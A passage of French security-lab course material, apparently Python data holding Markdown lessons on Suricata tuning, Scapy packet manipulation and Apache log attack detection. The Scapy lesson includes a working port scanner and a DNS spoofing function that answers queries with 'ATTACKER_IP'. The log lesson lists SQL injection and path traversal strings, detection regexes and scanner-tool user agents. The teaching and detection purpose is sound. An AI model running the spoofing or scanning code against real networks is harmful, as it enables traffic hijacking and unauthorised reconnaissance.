suppress gen_id 1, sig_id 2100498
threshold gen_id 1, sig_id 2100366, type limit, track by_src, count 1, seconds 60
```

### Monitoring des performances

```bash
# Stats Suricata
suricatasc -c "iface-stat eth0"

# Drops de paquets
cat /var/log/suricata/stats.log | grep drop
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Règles trop permissives

```
# MAUVAIS : génère trop d'alertes
alert tcp any any -> any any (msg:"Traffic"; sid:1;)

# BON : ciblé et filtré
alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (
    msg:"Web attack";
    content:"/admin"; http_uri;
    threshold:type limit, track by_src, count 1, seconds 60;
    sid:1;)
```

### ❌ Ignorer les performances

```bash
# Vérifier la charge CPU
top -p $(pgrep suricata)

# Si drops > 1%, augmenter les workers
# /etc/suricata/suricata.yaml
threading:
  set-cpu-affinity: yes
  cpu-affinity:
    - management-cpu-set:
        cpu: [ 0 ]
    - worker-cpu-set:
        cpu: [ 1, 2, 3 ]
```
""",
        "tools": """
## Outils du Lab

### Interfaces web

- **Commander** : http://localhost:3000
- **EveBox** (Suricata) : http://localhost:5636
- **Filebrowser** : http://localhost:8080

### Scripts utiles

```bash
# Test rapide
./quick_test.sh snort

# Scan tous les niveaux
./scan_all_levels.sh

# Générer rapport
./generate_report.sh
```
""",
        "references": """
## Références

- [Snort Rules](https://www.snort.org/rules_explanation)
- [Suricata Documentation](https://suricata.readthedocs.io/)
- [Zeek Documentation](https://docs.zeek.org/)
"""
    },

    "Scapy.Strategies": {
        "title": "Scapy - Manipulation de Paquets Réseau",
        "intro": """
## Introduction

**Scapy** est une bibliothèque Python puissante pour la manipulation, l'envoi, la capture et l'analyse de paquets réseau.

### Capacités

- Création de paquets personnalisés
- Scan de ports et de réseaux
- Attaques réseau (ARP spoofing, etc.)
- Analyse de trafic
- Fuzzing de protocoles
""",
        "theory": """
## Théorie et Concepts

### Modèle en couches

```python
# Scapy permet de manipuler chaque couche
Ether() / IP() / TCP() / Raw()
#  L2      L3     L4      L7

# Exemple concret
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \\
      IP(dst="192.168.1.1") / \\
      TCP(dport=80, flags="S")
```

### Opérations de base

| Opération | Fonction | Description |
|-----------|----------|-------------|
| Création | `IP()`, `TCP()` | Créer des paquets |
| Envoi | `send()`, `sendp()` | Envoyer L3 ou L2 |
| Réception | `sr()`, `sr1()` | Send & Receive |
| Capture | `sniff()` | Capturer le trafic |
| Lecture | `rdpcap()` | Lire un fichier pcap |
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Création et envoi de paquets

```python
from scapy.all import *

# Ping ICMP
pkt = IP(dst="192.168.1.1") / ICMP()
reply = sr1(pkt, timeout=2)
if reply:
    print(f"Réponse de {reply.src}")

# TCP SYN
syn = IP(dst="192.168.1.1") / TCP(dport=80, flags="S")
syn_ack = sr1(syn, timeout=2)
if syn_ack and syn_ack.haslayer(TCP):
    if syn_ack[TCP].flags == "SA":
        print("Port 80 ouvert")
```

### 2. Scanner de ports

```python
def port_scan(target, ports):
    open_ports = []

    for port in ports:
        pkt = IP(dst=target) / TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=1, verbose=0)

        if resp and resp.haslayer(TCP):
            if resp[TCP].flags == 0x12:  # SYN-ACK
                open_ports.append(port)
                # Envoyer RST pour fermer proprement
                rst = IP(dst=target) / TCP(dport=port, flags="R")
                send(rst, verbose=0)

    return open_ports

# Utilisation
ports = port_scan("192.168.1.1", range(1, 1024))
print(f"Ports ouverts: {ports}")
```

### 3. ARP Scan

```python
def arp_scan(network):
    # Broadcast ARP
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network)

    answered, _ = srp(arp_request, timeout=2, verbose=0)

    hosts = []
    for sent, received in answered:
        hosts.append({
            'ip': received.psrc,
            'mac': received.hwsrc
        })

    return hosts

# Scanner le réseau local
hosts = arp_scan("192.168.1.0/24")
for h in hosts:
    print(f"{h['ip']:15} {h['mac']}")
```

### 4. Sniffing avec filtres

```python
def packet_callback(pkt):
    if pkt.haslayer(TCP):
        src = f"{pkt[IP].src}:{pkt[TCP].sport}"
        dst = f"{pkt[IP].dst}:{pkt[TCP].dport}"
        flags = pkt[TCP].flags
        print(f"{src} -> {dst} [{flags}]")

# Capturer le trafic HTTP
sniff(filter="tcp port 80", prn=packet_callback, count=100)

# Capturer et sauvegarder
packets = sniff(filter="tcp", count=1000)
wrpcap("capture.pcap", packets)
```

### 5. DNS Spoofing

```python
def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):  # DNS Query
        spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \\
                  UDP(dport=pkt[UDP].sport, sport=53) / \\
                  DNS(id=pkt[DNS].id, qr=1, aa=1,
                      qd=pkt[DNS].qd,
                      an=DNSRR(rrname=pkt[DNSQR].qname,
                               rdata="ATTACKER_IP"))

        send(spoofed, verbose=0)
        print(f"Spoofed: {pkt[DNSQR].qname.decode()}")

# Attention: uniquement sur réseau de test!
sniff(filter="udp port 53", prn=dns_spoof)
```

### 6. Traceroute personnalisé

```python
def traceroute_custom(target, max_ttl=30):
    for ttl in range(1, max_ttl + 1):
        pkt = IP(dst=target, ttl=ttl) / ICMP()
        reply = sr1(pkt, timeout=1, verbose=0)

        if reply is None:
            print(f"{ttl}. *")
        elif reply.haslayer(ICMP):
            print(f"{ttl}. {reply.src}")

            if reply[ICMP].type == 0:  # Echo Reply
                print(f"Destination atteinte!")
                break

traceroute_custom("8.8.8.8")
```
""",
        "best_practices": """
## Bonnes Pratiques

### Performance

```python
# Utiliser les sockets raw pour le volume
conf.L3socket = L3RawSocket

# Désactiver la résolution DNS
conf.resolve = False

# Paralléliser les scans
from concurrent.futures import ThreadPoolExecutor

def scan_port(target, port):
    pkt = IP(dst=target) / TCP(dport=port, flags="S")
    return sr1(pkt, timeout=0.5, verbose=0)

with ThreadPoolExecutor(max_workers=50) as executor:
    results = executor.map(lambda p: scan_port(target, p), ports)
```

### Gérer les permissions

```python
import os
import sys

if os.geteuid() != 0:
    print("Ce script nécessite les droits root")
    sys.exit(1)
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Oublier de fermer les connexions

```python
# MAUVAIS : laisse des connexions half-open
sr1(IP(dst=t)/TCP(dport=80,flags="S"))

# BON : envoyer RST après
resp = sr1(IP(dst=t)/TCP(dport=80,flags="S"), timeout=1)
if resp:
    send(IP(dst=t)/TCP(dport=80,flags="R"), verbose=0)
```

### ❌ Flood accidentel

```python
# MAUVAIS : boucle infinie sans délai
while True:
    send(pkt)

# BON : avec rate limiting
import time
for _ in range(100):
    send(pkt, verbose=0)
    time.sleep(0.1)
```
""",
        "tools": """
## Fonctions utiles

```python
# Résumé d'un paquet
pkt.summary()

# Affichage détaillé
pkt.show()

# Hexdump
hexdump(pkt)

# Graphique de conversation
conversations = sniff(count=100)
conversations.conversations()
```
""",
        "references": """
## Références

- [Scapy Documentation](https://scapy.readthedocs.io/)
- [Scapy Cheat Sheet](https://scapy.net/doc/usage.html)
"""
    },

    "Python.Apache.Logs": {
        "title": "Analyse de Logs Apache",
        "intro": """
## Introduction

L'analyse des **logs Apache** permet de détecter les attaques, surveiller le trafic et identifier les comportements anormaux.

### Types de logs

- **access.log** : Toutes les requêtes HTTP
- **error.log** : Erreurs et avertissements
- **ssl_access.log** : Trafic HTTPS
""",
        "theory": """
## Théorie et Concepts

### Format Combined Log

```
192.168.1.100 - admin [10/Oct/2024:13:55:36 -0700] "GET /admin HTTP/1.1" 200 2326 "http://example.com" "Mozilla/5.0"
└─────┬─────┘ ├┘└──┬─┘ └─────────────┬──────────────┘ └────────────┬────────────┘ └┬┘ └─┬┘ └───────┬──────────┘ └─────────┬──────────┘
      │       │    │                 │                              │               │    │         │                      │
   IP client  │ user           timestamp                         request         status size    referer              user-agent
           ident
```

### Patterns d'attaque

| Pattern | Description | Exemple |
|---------|-------------|---------|
| SQL Injection | Tentatives SQLi | `UNION SELECT`, `' OR 1=1` |
| Path Traversal | Accès fichiers | `../../../etc/passwd` |
| Scanner | Enumération | 100+ requêtes/min |
| Brute Force | Auth répétée | 401 répétés |
| XSS | Injection script | `<script>`, `onerror=` |
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Parser les logs

```python
import re
from datetime import datetime
from collections import defaultdict

LOG_PATTERN = re.compile(
    r'(?P<ip>\\S+) \\S+ (?P<user>\\S+) '
    r'\\[(?P<time>[^\\]]+)\\] '
    r'"(?P<method>\\S+) (?P<path>\\S+) (?P<protocol>[^"]+)" '
    r'(?P<status>\\d+) (?P<size>\\S+) '
    r'"(?P<referer>[^"]*)" "(?P<agent>[^"]*)"'
)

def parse_log_line(line):
    match = LOG_PATTERN.match(line)
    if match:
        data = match.groupdict()
        data['time'] = datetime.strptime(
            data['time'], '%d/%b/%Y:%H:%M:%S %z'
        )
        data['status'] = int(data['status'])
        data['size'] = int(data['size']) if data['size'] != '-' else 0
        return data
    return None

def parse_log_file(filepath):
    entries = []
    with open(filepath, 'r') as f:
        for line in f:
            entry = parse_log_line(line)
            if entry:
                entries.append(entry)
    return entries
```

### 2. Détection d'anomalies

```python
SQLI_PATTERNS = [
    r"('|\")(\\s)*(or|and)(\\s)+",
    r"union(\\s)+select",
    r"(\\%27|\\').*?--",
    r"exec(\\s|\\+)+(s|x)p\\w+",
]

TRAVERSAL_PATTERNS = [
    r"\\.\\./",
    r"\\.\\.\\\\\",
    r"%2e%2e[%2f\\\\]",
]

def detect_attacks(entries):
    attacks = []

    for entry in entries:
        path = entry['path'].lower()

        # SQL Injection
        for pattern in SQLI_PATTERNS:
            if re.search(pattern, path, re.I):
                attacks.append({
                    'type': 'SQLi',
                    'ip': entry['ip'],
                    'path': entry['path'],
                    'time': entry['time']
                })
                break

        # Path Traversal
        for pattern in TRAVERSAL_PATTERNS:
            if re.search(pattern, path, re.I):
                attacks.append({
                    'type': 'Traversal',
                    'ip': entry['ip'],
                    'path': entry['path'],
                    'time': entry['time']
                })
                break

    return attacks
```

### 3. Analyse des scanners

```python
def detect_scanners(entries, threshold=100, window_minutes=5):
    from collections import defaultdict

    requests_per_ip = defaultdict(list)

    for entry in entries:
        requests_per_ip[entry['ip']].append(entry['time'])

    scanners = []

    for ip, times in requests_per_ip.items():
        times.sort()

        for i, t in enumerate(times):
            window_end = t + timedelta(minutes=window_minutes)
            count = sum(1 for x in times[i:] if x <= window_end)

            if count >= threshold:
                scanners.append({
                    'ip': ip,
                    'count': count,
                    'start': t
                })
                break

    return scanners
```

### 4. Rapport automatisé

```python
def generate_report(log_file):
    entries = parse_log_file(log_file)

    # Stats générales
    total = len(entries)
    status_counts = defaultdict(int)
    ip_counts = defaultdict(int)

    for e in entries:
        status_counts[e['status']] += 1
        ip_counts[e['ip']] += 1

    # Top IPs
    top_ips = sorted(ip_counts.items(), key=lambda x: -x[1])[:10]

    # Détection
    attacks = detect_attacks(entries)
    scanners = detect_scanners(entries)

    print(f"=== Rapport d'analyse ===")
    print(f"Total requêtes: {total}")
    print(f"\\nStatus codes:")
    for status, count in sorted(status_counts.items()):
        print(f"  {status}: {count}")

    print(f"\\nTop 10 IPs:")
    for ip, count in top_ips:
        print(f"  {ip}: {count}")

    print(f"\\nAttaques détectées: {len(attacks)}")
    print(f"Scanners détectés: {len(scanners)}")
```
""",
        "best_practices": """
## Bonnes Pratiques

### Rotation des logs

```bash
# /etc/logrotate.d/apache2
/var/log/apache2/*.log {
    daily
    rotate 14
    compress
    delaycompress
    notifempty
    create 640 root adm
    postrotate
        /etc/init.d/apache2 reload > /dev/null
    endscript
}
```

### Centralisation

```bash
# Envoyer à un SIEM
# /etc/rsyslog.d/apache.conf
module(load="imfile")
input(type="imfile"
      File="/var/log/apache2/access.log"
      Tag="apache-access"
      Severity="info")

*.* @@siem.example.com:514
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Ignorer les User-Agents

```python
# Les scanners automatisés ont souvent des UA suspects
SUSPICIOUS_UA = [
    'sqlmap', 'nikto', 'nmap', 'masscan',
    'python-requests', 'curl', 'wget'
]
```
""",
        "tools": """
## Outils

- **GoAccess** : Analyseur temps réel
- **AWStats** : Statistiques web
- **Logwatch** : Rapports quotidiens
- **Graylog/ELK** : SIEM open source
""",
        "references": """
## Références

- [Apache Log Files](https://httpd.apache.org/docs/2.4/logs.html)
- [Log Analysis Best Practices](https://www.loggly.com/ultimate-guide/apache-logging-basics/)
"""
    },
}
